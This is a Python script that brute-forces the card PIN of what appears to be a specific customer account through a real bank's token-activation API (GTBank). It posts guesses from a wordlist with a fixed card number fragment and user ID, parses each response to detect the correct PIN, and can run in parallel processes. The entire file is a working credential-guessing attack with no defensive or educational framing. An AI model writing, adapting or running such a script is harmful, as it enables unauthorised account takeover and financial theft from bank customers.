import requests
import json, time
import multiprocessing as mp


def mainProg(m,n,p):
    url = "https://etokenactivation.gtbank.com/itokenRestR2/api/maxutdigipass/OnlineActivationWithCard"

    headers = {
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9.0; SM Build/SMF26Z)',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '43'
    }

    with open("comb.txt", "r") as handle:
        lines = handle.readlines()
    i = 1
    for line in lines[m:n]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line}")
        payload = (f"Pan=45143290&CardPin={line}&UserID=0025092595")
        #print("crafted pload")
        #try:
        response = requests.post(url, headers=headers, data=payload)
        x = response.text
        x1 = x[56:58]
        
        print(x1)
        
        if x1 == "0<":
            print(f"PROCESS==> {p}\n")
            print(x)
            print("\n Pin Found!")
            print(line)
            with open("found.txt", "a") as handle:
                lisnes = handle.write(line)
            exit()
        elif x1 == '11':
            print("Incorrect Pin!")

        else:
            print(x)
            print(x1)
            print(line)
            with open("error.txt", "a") as handle:
                lisnes = handle.write(line)
        
        i += 1
        time.sleep(2)
if __name__ == '__main__':
    filee = "pins.txt" #input("Enter file name: ")
    count1 = 10000
    
    p1 = mp.Process(target=mainProg, args=(0, int(count1), 1))
    """
    p2 = mp.Process(target=mainProg, args=(int(count1), int(count1*2), 2))
    p3 = mp.Process(target=mainProg, args=(int(count1*2), int(count1*3), 3))
    
    p4 = mp.Process(target=mainProg, args=(int(count1*3), int(count1*4), 4))
    p5 = mp.Process(target=mainProg, args=(int(count1*4), int(count1*5), 5))
    p6 = mp.Process(target=mainProg, args=(int(count1*5), int(count1*6), 6))
    p7 = mp.Process(target=mainProg, args=(int(count1*6), int(count1*7), 7))
    p8 = mp.Process(target=mainProg, args=(int(count1*7), int(count1*8), 8))
    p9 = mp.Process(target=mainProg, args=(int(count1*8), int(count1*9), 9))
    p10 = mp.Process(target=mainProg, args=(int(count1*9), int(count1*10), 10))
    """
    p1.start()
    """
    p2.start()
    
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    """
    
